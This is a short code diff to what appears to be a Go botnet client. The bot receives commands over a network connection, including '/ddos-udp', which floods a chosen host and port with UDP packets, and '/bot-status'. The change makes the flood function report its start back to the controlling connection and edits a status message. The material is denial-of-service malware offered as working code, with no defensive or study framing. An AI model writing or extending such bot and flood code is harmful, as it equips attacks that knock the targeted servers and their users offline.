@@ -30,9 +30,13 @@ func sendUdp(data string, serverAddr *net.UDPAddr) {
 	}
 }
 
-func udpFlood(host string, port string, pkg_c int) {
+func udpFlood(host string, port string, pkg_c int, conn net.Conn) {
 	udpString := "<UDP>BABABUUY<UDP>"
 	data, serverAddr := CreateUdpDatagramm(udpString, host, port)
+
+	s := fmt.Sprintf("UDP-FLOOD start pkg[ %d ] & host- %s -", pkg_c, host)
+
+	sendData(conn, s)
 
 	if pkg_c > 0 {
 		for i := 0; i <= pkg_c; i++ {
@@ -87,11 +91,11 @@ func source(cmd string, conn net.Conn) {
 	switch cmdParam {
 	case "/ddos-udp":
 		ip, port, pkg_c := getIpPortWC(cmd)
-		udpFlood(ip, port, pkg_c)
+		udpFlood(ip, port, pkg_c, conn)
 		sendData(conn, "Udp.Flood&Success")
 
 	case "/bot-status":
-		sendData(conn, "<200> connection - Stable & err - 0")
+		sendData(conn, "|200| connection - Stable&err - 0")
 	}
 }
 
